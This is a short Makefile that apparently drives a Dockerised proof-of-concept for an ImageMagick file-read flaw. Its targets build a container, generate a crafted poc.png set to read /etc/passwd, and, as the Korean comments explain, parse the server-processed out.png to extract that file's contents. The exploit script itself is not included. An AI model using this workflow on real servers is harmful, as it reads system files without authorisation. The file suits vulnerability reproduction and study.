# Makefile

IMAGE_NAME=imagemagick
CONTAINER_NAME=imagemagick_container
POC_PNG =poc.png
OUT_PNG =out.png

build:
	docker build -t $(IMAGE_NAME) -f ./Dockerfile .

run:
	docker run --name $(CONTAINER_NAME) -p 8080:8080 -d $(IMAGE_NAME)

#작업한 자료 모두 삭제
clean:
	docker stop $(CONTAINER_NAME)
	docker rm $(CONTAINER_NAME)
	docker rmi $(IMAGE_NAME)
	del $(POC_PNG)  
	del $(OUT_PNG)

#poc.py 실행
generate:
	python poc.py generate -o poc.png -r /etc/passwd

#poc.py 실행 후 서버에 poc.png 파일을 업로드 하고
#업로드한 파일을 out.png로 다시 다운 받은 뒤 실행하면 etc/password 내용 추출
parse:
	python poc.py parse -i out.png
